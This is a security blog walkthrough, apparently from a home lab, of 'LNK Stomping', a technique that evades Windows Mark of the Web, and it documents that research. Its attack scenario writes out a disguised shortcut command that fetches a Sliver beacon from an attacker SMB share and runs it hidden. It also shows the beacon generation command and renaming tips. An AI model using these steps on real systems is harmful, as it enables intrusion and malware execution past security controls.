---
title: "LNK Stomping"
date: 2024-09-04T17:17:01-06:00
draft: false
---


This [PoC provided by Elastic](https://github.com/joe-desimone/rep-research) is about LNK Stomping. Currently Microsoft has not provided a CVE for this method; however, they did release CVE-2024-38212, a MotW bypass vulnerability, but only included SmartScreen, not Smart App Control (SAC). As this testing is done on Windows 10 with build number 19045, I won't be dealing with SAC anyway. The PoC can bypass both.

A quick primer on MotW from Elastic:
> When a user downloads a file, the browser will create an associated “Zone.Identifier” file in an [alternate data stream](https://www.digital-detective.net/forensic-analysis-of-zone-identifier-stream/) (ADS) known as the Mark of the Web (MotW). This lets other software (including AV and EDR) on the system know that the file is more risky. SmartScreen only scans files with the Mark of the Web. SAC completely blocks certain file types if they have it. This makes MotW bypasses an interesting research target, as it can usually lead to bypassing these security systems. Financially motivated threat groups have discovered and leveraged [multiple vulnerabilities](https://blog.google/threat-analysis-group/magniber-ransomware-actors-used-a-variant-of-microsoft-smartscreen-bypass/) to bypass MotW checks. These techniques involved appending crafted and invalid code signing signatures to javascript or MSI files.

I explained what an ADS is in a previous post [T1564.004](https://axelarator.github.io/ntfs)
> A data stream that is alternate to the normal data stream. The data attribute (`$DATA`) is called the “normal” data stream or “unnamed” data stream since it can be left blank.
>     - A normal data stream looks like `$DATA:""`
>     - An alternate data stream can be `$DATA:"SecondStream"`
> - To read what’s inside an ADS
>     - `Get-Item -path <file> -stream *`
>     - `Get-Content -path <file> -stream <stream name>`
> - To add streams to a file
>     - `set-content -path <path> -stream <stream name>`
> - To search for ADS
>     - `gci -recurse | % { gi $_.FullName - stream * } | where stream -ne ':$Data'`
> - To remove ADS
>     - `remove-item -path <path> -stream <stream name>`
> - A sysinternals tool called `streams.exe` can also enumerate streams
>     - `streams <file path>`

To provide a more visual explanation, taking the PoC GithHub repo above, you can view the data streams within the ZIP file (`Get-Item`) and view the contents to see where it came from (`Get-Content`). I downloaded the ZIP directly because cloning the repo only provides a `$DATA` stream. The Git client simply does not have a Zone.Identifier ADS which can also be treated as a way to bypass MotW. 
![1.png](/lnkstomping/1.png)

What's interesting from the first screenshot is the inclusion of a SmartScreen data stream. This is a stream that provides an additional hook into the registered AV engine.

![3.png](/lnkstomping/3.png)

SysInternals also includes a tool if that command is too annoying to type out. The caveat being you can't view the content.
https://learn.microsoft.com/en-us/sysinternals/downloads/streams

![4.png](/lnkstomping/4.png)

Now rather than just using a different file type like an ISO embedded within a ZIP archive, something [Black Basta](https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html) and numerous other threat actors have done in the past, Elastic uncovered another trivial way of evading MotW by using LNK files with non-standard target paths or internal structures. When the file is clicked, `explorer.exe` modifies the file with canonical formatting, removing the MotW label. 
In this example, I used the dot variant which appends a dot after the PowerShell executable so it looks like `~\powershell.exe.` 

```python
python lnk_stomping.py --executable c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe --arguments "-c calc" --icon folder --variant dot --output totally_legit.lnk
```

The `--icon` argument argument can either make the LNK file to appear as a folder or pdf icon. An [obfuscation method](https://attack.mitre.org/techniques/T1027/012/) threat actors use to make their files appear legit.

![5.png](/lnkstomping/5.png)

Using Eric Zimmerman's tool LECMD, the path with the dot operator can be seen
![6.png](/lnkstomping/6.png)

Since all of this was done locally, testing if it evades MotW won't work since it was never applied in the first place. Instead, I hosted this file elsewhere and download it to my Windows system and you can see below the Zone.Identifier stream attached. If you're wondering why the filename changed, the GitHub repo hosts sample files already configured with dot, path segment, and relative variants. Each of them can be recreated anyway using the Python script and supplying the appropriate variant you want to test.

![7.png](/lnkstomping/7.png)

Following execution with a successful `calc.exe` process opened, the stream is gone!
![8.png](/lnkstomping/8.png)

Viewing the LNK via LECMD again confirms Windows Explorer did indeed modify the file to fix the trailing dot.
![9.png](/lnkstomping/9.png)

### Attack Scenario

To put a little more effort into this, I modified the arguments to download a remote file and execute it to gain a Sliver beacon. I'm not trying to win any awards for defense evasion or command obfuscation but you could simplify this a bit with `psexec`. However, since `psexec` is a part of the Sysinternals suite, it would rely on the victim already having it installed which in this case isn't realistic. 

`-c net use \\192.168.98.108\kalishare /USER:anon anon; copy \\192.168.98.108\kalishare\READY_CANAL.exe; powershell.exe -WindowStyle hidden .\READY_CANAL.exe" --icon pdf --variant dot --output sliver.lnk`

The command starts by connecting to an SMB share running on the attacker system with credentials anon:anon. 

![10.png](/lnkstomping/10.png)

Next, it copies the Sliver beacon to the victim's current working directory. But in order to copy a beacon, one has to be created first. Within the sliver terminal:

`generate beacon -b 192.168.98.108 --skip-symbols --debug -j 5 -S 15 --os windows`

Without providing a name, it will create a randomly generated one which in this case is `ROYAL_CANAL.exe`. Better opsec would be to rename this as a process already present on Windows, like `svchost.exe`. It won't totally evade detection as Sliver is very well known and Windows Defender signatures will flag and purge this instantly, but it's a start. Next steps would be to implement something like [PEzore](https://iwantmore.pizza/posts/PEzor.html)

So with a beacon payload generated and an SMB share running, the last step is to start an HTTPS listener so the beacon has something to connect back to.

![11.png](/lnkstomping/11.png)

Everything's ready so it's time to execute! Following execution, Sliver got a callback. 
![12.png](/lnkstomping/12.png)

From here, it's up to the features of Sliver and any additional tools within the Armory to carry out further attacks. If noise is what you're after, you could run `seatbelt -i -- -group=system` to dump everything about the current system. Mainly Event ID's 4798 (group-membership-enumerated) and 4799 (user-member-enumerated). 
Since this is an HTTPS beacon, you'll see a lot of Sysmon event ID 3 ( Network connection detected) logs too for each task and check-in. 

For this lab, the user account is vulnerable by default and a part of the Administrators group so owning the system is quite easy.

![13.png](/lnkstomping/13.png)

### References
https://www.elastic.co/security-labs/dismantling-smart-app-control
https://github.com/joe-desimone/rep-research
https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/
https://unprotect.it/technique/mark-of-the-web-motw-bypass/
